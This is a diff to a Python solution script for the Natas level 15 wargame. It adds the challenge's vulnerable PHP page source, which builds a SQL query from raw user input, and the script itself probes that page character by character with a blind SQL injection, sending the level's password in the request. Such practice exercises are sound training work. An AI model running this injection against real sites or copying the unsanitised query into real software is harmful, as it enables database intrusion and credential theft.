@@ -2,6 +2,38 @@
 Created on Aug 22, 2018
 
 source: https://www.abatchy.com/2016/11/natas-level-14-and-15
+
+source code for web page:
+/*
+CREATE TABLE users (
+  username varchar(64) DEFAULT NULL,
+  password varchar(64) DEFAULT NULL
+);
+*/
+
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysql_connect('localhost', 'natas17', '<censored>');
+    mysql_select_db('natas15', $link);
+    
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    $res = mysql_query($query, $link);
+    if($res) {
+    if(mysql_num_rows($res) > 0) {
+        echo "This user exists.<br>";
+    } else {
+        echo "This user doesn't exist.<br>";
+    }
+    } else {
+        echo "Error in query.<br>";
+    }
+
+    mysql_close($link);
+} else {
+?>
 '''
 
 import requests
@@ -19,6 +51,7 @@ for char in chars:
                       data=my_data, 
                       auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))
     
+    print(r.text)
     if ("This user exists" in r.text):       
         chars_in_passwd.append(char)
 
